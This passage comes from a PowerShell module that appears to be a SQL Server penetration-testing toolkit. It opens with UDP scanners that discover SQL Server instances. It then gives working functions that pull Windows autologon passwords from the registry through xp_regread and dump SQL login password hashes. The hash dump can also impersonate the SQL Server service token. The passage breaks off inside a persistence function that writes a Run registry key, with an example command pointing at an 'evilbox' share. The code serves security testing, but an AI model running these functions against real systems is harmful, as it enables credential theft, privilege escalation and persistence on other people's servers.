                # Send request to system
                $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                $UDPClient.Client.Blocking = $true
                [void]$UDPClient.Send($UDPPacket,$UDPPacket.Length)

                # Process response from system
                $BytesRecived = $UDPClient.Receive([ref]$UDPEndpoint)
                $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')

                $values = @{}

                for($i = 0; $i -le $Response.length; $i++)
                {
                    if(![string]::IsNullOrEmpty($Response[$i]))
                    {
                        $values.Add(($Response[$i].ToLower() -replace '[\W]', ''),$Response[$i+1])
                    }
                    else
                    {
                        if(![string]::IsNullOrEmpty($values.'tcp'))
                        {
                            if(-not $SuppressVerbose)
                            {
                                $DiscoveredInstance = "$ComputerName\"+$values.'instancename'
                                Write-Verbose -Message "$ComputerName - Found: $DiscoveredInstance"
                            }

                            # Add SQL Server instance info to results table
                            $null = $TableResults.rows.Add(
                                [string]$ComputerName,
                                [string]"$ComputerName\"+$values.'instancename',
                                [string]$values.'instancename',
                                [string]$IPAddress,
                                [string]$values.'tcp',
                                [string]$values.'version',
                            [string]$values.'isclustered')
                            $values = @{}
                        }
                    }
                }

                # Close connection
                $UDPClient.Close()
            }
            catch
            {
                #"Error was $_"
                #$line = $_.InvocationInfo.ScriptLineNumber
                #"Error was in Line $line"

                # Close connection
                # $UDPClient.Close()
            }
        }
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message " - $ComputerName - UDP Scan Complete."
        }
    }

    End
    {
        # Return Results
        $TableResults
    }
}


# ----------------------------------
#  Get-SQLInstanceScanUDPThreaded
# ----------------------------------
# Author: Eric Gruber
# Note: Pipeline and timeout mods by Scott Sutherland
function Get-SQLInstanceScanUDPThreaded
{
    <#
            .SYNOPSIS
            Returns a list of SQL Servers resulting from a UDP discovery scan of provided computers.
            .PARAMETER ComputerName
            Computer name or IP address to enumerate SQL Instance from.
            .PARAMETER UDPTimeOut
            Timeout in seconds. Longer timeout = more accurate.
            .PARAMETER Threads
            Number of concurrent host threads.
            .EXAMPLE
            PS C:\> Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1.domain.com
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Express
            InstanceName : Express
            ServerIP     : 10.10.10.30
            TCPPort      : 51663
            BaseVersion  : 11.0.2100.60
            IsClustered  : No

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Standard
            InstanceName : Standard
            ServerIP     : 10.10.10.30
            TCPPort      : 51861
            BaseVersion  : 11.0.2100.60
            IsClustered  : No
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLInstanceScanUDP -Verbose -Threads 20
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.


            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Express
            InstanceName : Express
            ServerIP     : 10.10.10.30
            TCPPort      : 51663
            BaseVersion  : 11.0.2100.60
            IsClustered  : No

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Standard
            InstanceName : Standard
            ServerIP     : 10.10.10.30
            TCPPort      : 51861
            BaseVersion  : 11.0.2100.60
            IsClustered  : No
            [TRUNCATED]
    #>

    [CmdletBinding()]
    param(

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for results
        $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList 'Table'
        $null = $TableResults.columns.add('ComputerName')
        $null = $TableResults.columns.add('Instance')
        $null = $TableResults.columns.add('InstanceName')
        $null = $TableResults.columns.add('ServerIP')
        $null = $TableResults.columns.add('TCPPort')
        $null = $TableResults.columns.add('BaseVersion')
        $null = $TableResults.columns.add('IsClustered')
        $TableResults.Clear()

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # Ensure provide instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
            $PipelineItems = $PipelineItems + $ProvideInstance
        }
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $ComputerName = $_.ComputerName

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message " - $ComputerName - UDP Scan Start."
            }


            # Verify server name isn't empty
            if ($ComputerName -ne '')
            {
                # Try to enumerate SQL Server instances from remote system
                try
                {
                    # Resolve IP
                    $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)

                    # Create UDP client object
                    $UDPClient = New-Object -TypeName System.Net.Sockets.Udpclient

                    # Attempt to connect to system
                    $UDPTimeOutMilsec = $UDPTimeOut * 1000
                    $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                    $UDPClient.Connect($ComputerName,0x59a)
                    $UDPPacket = 0x03

                    # Send request to system
                    $UDPEndpoint = New-Object -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                    $UDPClient.Client.Blocking = $true
                    [void]$UDPClient.Send($UDPPacket,$UDPPacket.Length)

                    # Process response from system
                    $BytesRecived = $UDPClient.Receive([ref]$UDPEndpoint)
                    $Response = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')

                    $values = @{}

                    for($i = 0; $i -le $Response.length; $i++)
                    {
                        if(![string]::IsNullOrEmpty($Response[$i]))
                        {
                            $values.Add(($Response[$i].ToLower() -replace '[\W]', ''),$Response[$i+1])
                        }
                        else
                        {
                            if(![string]::IsNullOrEmpty($values.'tcp'))
                            {
                                if(-not $SuppressVerbose)
                                {
                                    $DiscoveredInstance = "$ComputerName\"+$values.'instancename'
                                    Write-Verbose -Message " - $ComputerName - Found: $DiscoveredInstance"
                                }

                                # Add SQL Server instance info to results table
                                $null = $TableResults.rows.Add(
                                    [string]$ComputerName,
                                    [string]"$ComputerName\"+$values.'instancename',
                                    [string]$values.'instancename',
                                    [string]$IPAddress,
                                    [string]$values.'tcp',
                                    [string]$values.'version',
                                [string]$values.'isclustered')
                                $values = @{}
                            }
                        }
                    }

                    # Close connection
                    $UDPClient.Close()
                }
                catch
                {
                    #"Error was $_"
                    #$line = $_.InvocationInfo.ScriptLineNumber
                    #"Error was in Line $line"

                    # Close connection
                    # $UDPClient.Close()
                }
            }

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message " - $ComputerName - UDP Scan End."
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TableResults
    }
}

# ----------------------------------
#  Get-SQLInstanceFile
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLInstanceFile
{
    <#
            .SYNOPSIS
            Returns a list of SQL Server instances from a file.
            One per line. Three instance formats supported:
            1 - computername
            2 - computername\instance
            3 - computername,1433
            .PARAMETER FilePath
            Path to file containing instances.  One per line.
            .EXAMPLE
            PS C:\> Get-SQLInstanceFile -Verbose -FilePath c:\temp\servers.txt
            VERBOSE: Importing instances from file path.
            VERBOSE: 3 instances where found in c:\temp\servers.txt.

            ComputerName   Instance
            ------------   --------
            Computer1      Computer1\SQLEXPRESS
            Computer1      Computer1\STANDARDDEV2014
            Computer1      Computer1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true,
        HelpMessage = 'The file path.')]
        [string]$FilePath
    )

    Begin
    {
        # Table for output
        $TblFileInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblFileInstances.Columns.Add('ComputerName')
        $null = $TblFileInstances.Columns.Add('Instance')
    }

    Process
    {
        # Test file path
        if(Test-Path $FilePath)
        {
            Write-Verbose -Message 'Importing instances from file path.'
        }
        else
        {
            Write-Output -InputObject 'File path does not appear to be valid.'
            break
        }

        # Grab lines from file
        Get-Content -Path $FilePath |
        ForEach-Object -Process {
            $Instance = $_
            if($Instance.Split(',')[1])
            {
                $ComputerName = $Instance.Split(',')[0]
            }
            else
            {
                $ComputerName = $Instance.Split('\')[0]
            }

            # Add record
            if($_ -ne '')
            {
                $null = $TblFileInstances.Rows.Add($ComputerName,$Instance)
            }
        }
    }

    End
    {

        # Status User
        $FileInstanceCount = $TblFileInstances.rows.count
        Write-Verbose -Message "$FileInstanceCount instances where found in $FilePath."

        # Return data
        $TblFileInstances
    }
}
#endregion

#########################################################################
#
#region          PASSWORD RECOVERY FUNCTIONS
#
#########################################################################

# ----------------------------------
#  Get-SQLRecoverPwAutoLogon
# ----------------------------------
# Author: Scott Sutherland
Function   Get-SQLRecoverPwAutoLogon
{
    <#
            .SYNOPSIS
            Returns the Windows auto login credentials through SQL Server using xp_regread. 
            This requires sysadmin privileges.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .Example
            PS C:\> Get-SQLInstanceLocal |  Get-SQLRecoverPwAutoLogon -Verbose
            VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1 : Connection Success.


            ComputerName : SQLServer1
            Instance     : SQLServer1\SQLEXPRESS
            Domain       : Demo
            UserName     : KioskAdmin
            Password     : KioskPassword!

            ComputerName : SQLServer1
            Instance     : SQLServer1\SQLEXPRESS
            Domain       : Demo
            UserName     : kioskuser
            Password     : KioskUserPassword!

            .Example
            PS C:\> Get-SQLRecoverPwAutoLogon -Verbose -instance SQLServer1\STANDARDDEV2014
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.


            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            Domain       : localhost
            UserName     : KioskAdmin
            Password     : KioskPassword!

            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            Domain       : localhost2
            UserName     : kioskuser
            Password     : KioskUserPassword!

            .Notes
            https://support.microsoft.com/en-us/kb/321185
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblWinAutoCreds = New-Object -TypeName System.Data.DataTable
        $TblWinAutoCreds.Columns.Add("ComputerName") | Out-Null
        $TblWinAutoCreds.Columns.Add("Instance") | Out-Null
        $TblWinAutoCreds.Columns.Add("Domain") | Out-Null
        $TblWinAutoCreds.Columns.Add("UserName") | Out-Null
        $TblWinAutoCreds.Columns.Add("Password") | Out-Null
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Get SQL Server version number
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        # Check if this can actually run with the current login
        if($IsSysadmin -ne "Yes")
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }

        # Get default auto login Query
        $DefaultQuery = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get AutoLogin Default Domain
        DECLARE @AutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultDomainName',
        @value			= @AutoLoginDomain output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultUserName',
        @value			= @AutoLoginUser output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultPassword',
        @value			= @AutoLoginPassword output

        -- Display Results
        SELECT Domain = @AutoLoginDomain, Username = @AutoLoginUser, Password = @AutoLoginPassword"

        # Execute Default Query
        $DefaultResults = Get-SQLQuery -Instance $Instance -Query $DefaultQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose     
        $DefaultUsername = $DefaultResults.Username
        if($DefaultUsername.length -ge 2){

            # Add record to data table
            $DefaultResults | ForEach-Object{                
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }                    
        }else{
            Write-Verbose "$Instance : No default auto login credentials found."
        }

        # Get default alt auto login Query
        $AltQuery = "
        -------------------------------------------------------------------------
        -- Get Alternative Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get Alt AutoLogin Default Domain
        DECLARE @AltAutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultDomainName',
        @value			= @AltAutoLoginDomain output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultUserName',
        @value			= @AltAutoLoginUser output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultPassword',
        @value			= @AltAutoLoginPassword output

        -- Display Results
        SELECT Domain = @AltAutoLoginDomain, Username = @AltAutoLoginUser, Password = @AltAutoLoginPassword"

        # Execute Default Query
        $AltResults = Get-SQLQuery -Instance $Instance -Query $AltQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $AltUsername = $AltResults.Username
        if($AltUsername.length -ge 2){                            

             # Add record to data table
            $AltResults | ForEach-Object{               
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }
        }else{
            Write-Verbose "$Instance : No alternative auto login credentials found."
        }
    }

    End
    {
        # Return data
         $TblWinAutoCreds 
    }
}


# ----------------------------------
#  Get-SQLServerPasswordHash
# ----------------------------------
# Author: Mike Manzotti (@mmanzo_)
Function  Get-SQLServerPasswordHash
{
    <#
            .SYNOPSIS
            Returns logins from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER PrincipalName
            Pincipal name to filter for.
			.PARAMETER
			Migrate to SQL Server process.
            .EXAMPLE
            PS C:\> Get-SQLServerPasswordHash -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

			ComputerName        : SQLServer1
			Instance            : SQLServer1\STANDARDDEV2014
			PrincipalId         : 1
			PrincipalName       : sa
			PrincipalSid        : 7F883D1B...
			PrincipalType       : SQL_LOGIN
			CreateDate          : 19/03/2017 08:16:57
			DefaultDatabaseName : master
			PasswordHash        : 0x0200c8...
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerPasswordHash -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Migrate to SQL Server process.')]
        [switch]$Migrate,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblPasswordHashes = New-Object -TypeName System.Data.DataTable
        $null = $TblPasswordHashes.Columns.Add('ComputerName')
        $null = $TblPasswordHashes.Columns.Add('Instance')
        $null = $TblPasswordHashes.Columns.Add('PrincipalId')
        $null = $TblPasswordHashes.Columns.Add('PrincipalName')
        $null = $TblPasswordHashes.Columns.Add('PrincipalSid')
        $null = $TblPasswordHashes.Columns.Add('PrincipalType')
        $null = $TblPasswordHashes.Columns.Add('CreateDate')
        $null = $TblPasswordHashes.Columns.Add('DefaultDatabaseName')
        $null = $TblPasswordHashes.Columns.Add('PasswordHash')

        # Setup CredentialName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }else{
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }

            # If the migrate flag is set dont't return and attempt to migrate
            if($Migrate)
            {
                # Get current user name
                $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name

                # Verify local administrator privileges
                $IsAdmin = Get-SQLLocalAdminCheck
                
                # Return if the current user does not have local admin privs
                if($IsAdmin -ne $true){
                    write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
                        return
                }else{
                    write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
                }

                # Check for running sql service processes that match the instance
                Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
                [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
                [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
                
                # Return if no matches exist
                if ($TargetPid -eq 0){
                    Write-Verbose -Message "$Instance : No process running for provided instance..."
                    return
                }

                # Status user if a match is found
                Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
                Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
                
                # Attempt impersonation 
                try{
                    Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
                }catch{
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Impersonation failed."
                    Write-Verbose  -Message " $Instance : $ErrorMessage"
                    return
                }
            }else{            
                return
            }
        }            

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq 'Yes')
        {
            Write-Verbose -Message "$Instance : You are a sysadmin."
        }
        else
        {
            Write-Verbose -Message "$Instance : You are not a sysadmin."
            if($Migrate)
            {
                # Get current user name
                $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name

                # Verify local administrator privileges
                $IsAdmin = Get-SQLLocalAdminCheck
                
                # Return if the current user does not have local admin privs
                if($IsAdmin -ne $true){
                    write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
                        return
                }else{
                    write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
                }

                # Check for running sql service processes that match the instance
                 Write-Verbose -Message "$Instance : Impersonating SQL Server process:"  
                [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
                [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
                
                # Return if no matches exist
                if ($TargetPid -eq 0){
                    Write-Verbose -Message "$Instance : No process running for provided instance..."
                    return
                }

                # Status user if a match is found
                Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
                Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
                
                # Attempt impersonation 
                try{
                    Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
                }catch{
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Impersonation failed."
                    Write-Verbose  -Message " $Instance : $ErrorMessage"
                    return
                }
            }else{
                return
            }
        
        }

        # Status user
        Write-Verbose -Message "$Instance : Attempting to dump password hashes."

        # Check version
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        if([int]$SQLVersionShort -le 8)
        {

            # Define Query
            $Query = "USE master;
                SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
                name as [PrincipalName],
                createdate as [CreateDate],
			    dbname as [DefaultDatabaseName],
			    password as [PasswordHash]
                FROM [sysxlogins]"
        }
		else
        {
            # Define Query
            $Query = "USE master;
                SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
                name as [PrincipalName],
			    principal_id as [PrincipalId],
			    type_desc as [PrincipalType],
                sid as [PrincipalSid],
                create_date as [CreateDate],
			    default_database_name as [DefaultDatabaseName],
			    [sys].fn_varbintohexstr(password_hash) as [PasswordHash]
                FROM [sys].[sql_logins]"
        }

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblPasswordHashes.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $Sid,
                [string]$_.PrincipalType,
                $_.CreateDate,
                [string]$_.DefaultDatabaseName,
            [string]$_.PasswordHash)
        }

        # Status user
        Write-Verbose -Message "$Instance : Attempt complete."
        
        # Revert to original user context
        if($Migrate){          
            Invoke-TokenManipulation -RevToSelf | Out-Null
        }       
    }

    End
    {

        # Get hash count
        $PasswordHashCount = $TblPasswordHashes.Rows.Count
        write-verbose "$PasswordHashCount password hashes recovered."

        # Return table if hashes exist
        if($PasswordHashCount -gt 0){

            # Return data
            $TblPasswordHashes            
        }
    }
}

#endregion

#########################################################################
#
#region          DATA EXFILTRATION FUNCTIONS
#
#########################################################################
#
#endregion

#########################################################################
#
#region          PERSISTENCE FUNCTIONS
#
#########################################################################

# ----------------------------------
#  Get-SQLPersistRegRun  
# ----------------------------------
# Author: Scott Sutherland
Function   Get-SQLPersistRegRun
{
    <#
            .SYNOPSIS
            This function will use the xp_regwrite procedure to setup an 
            executable to automatically run when users log in.  The specific registry key is.
            HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run  
            Sysadmin privileges are required.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Name
            Registry value name.
            .PARAMETER Command
            Command to run.

            .Example
            PS C:\> Get-SQLPersistRegRun -Verbose -Name PureEvil -Command 'PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"' -Instance "SQLServer1\STANDARDDEV2014"
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write value: PureEvil
            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"
            VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Done.

            .Example
            PS C:\> Get-SQLPersistRegRun -Verbose -Name PureEvil -Command "\\evilbox\evil.exe" -Instance "SQLServer1\STANDARDDEV2014"
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write value: PureEvil
            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: \\evilbox\evil.exe
            VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Done.

            .Notes
            https://support.microsoft.com/en-us/kb/887165
            https://msdn.microsoft.com/en-us/library/aa940179(v=winembedded.5).aspx
            http://sqlmag.com/t-sql/using-t-sql-manipulate-registry
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Name of the registry value.')]
        [string]$Name = "Hacker",

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The command to run.')]
        [string]$Command = 'PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

